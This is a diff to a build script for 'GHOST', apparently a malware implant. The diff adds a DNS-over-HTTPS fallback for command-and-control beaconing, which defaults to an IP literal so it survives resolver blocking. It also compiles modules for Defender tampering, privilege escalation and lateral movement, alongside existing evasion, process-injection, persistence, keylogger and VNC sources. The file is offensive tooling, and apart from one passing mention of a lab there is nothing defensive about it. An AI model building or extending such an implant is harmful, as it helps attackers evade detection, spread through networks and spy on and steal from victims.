@@ -109,6 +109,14 @@ BEACON_MAX="${GHOST_BEACON_MAX:-24}"
 [[ "$BEACON_MIN" =~ ^[0-9]+$ && "$BEACON_MAX" =~ ^[0-9]+$ && "$BEACON_MIN" -ge 3 && "$BEACON_MIN" -le "$BEACON_MAX" ]] \
     || { echo "[!] invalid beacon timing (need 3 <= MIN <= MAX)"; exit 1; }
 
+# ── DoH fallback resolver (env: GHOST_DOH_URL) ────────────────────────────────
+# Endpoint for the DNS-over-HTTPS fallback transport (src/doh.cpp). Defaults to
+# an IP literal on purpose: when the lab resolver is what gets blocked, a
+# hostname endpoint would need the very resolution the fallback replaces.
+DOH_URL="${GHOST_DOH_URL:-https://1.1.1.1/dns-query}"
+[[ "$DOH_URL" == https://* ]] || { echo "[!] invalid DoH URL (must be https://): $DOH_URL"; exit 1; }
+echo "[*] DoH fallback endpoint: $DOH_URL"
+
 # ─────────────────────────────────────────────────────────────────────────────
 #  Shared compiler flags
 # ─────────────────────────────────────────────────────────────────────────────
@@ -192,12 +200,18 @@ echo "[*] Compiling $IMPLANT_OUT …"
     "-DGHOST_BEACON_TOKEN_W=L\"${BEACON_TOKEN}\"" \
     "-DGHOST_BEACON_MIN=${BEACON_MIN}" \
     "-DGHOST_BEACON_MAX=${BEACON_MAX}" \
+    "-DGHOST_DOH_URL=L\"${DOH_URL}\"" \
     src/main.cpp         \
     src/syscalls.cpp     \
     src/evasion.cpp      \
     src/injection.cpp    \
     src/persistence.cpp  \
     src/c2.cpp           \
+    src/doh.cpp          \
+    src/defender.cpp     \
+    src/disk.cpp         \
+    src/privesc.cpp      \
+    src/lateral.cpp      \
     src/keylog.cpp       \
     src/vnc.cpp          \
     src/utils.cpp        \
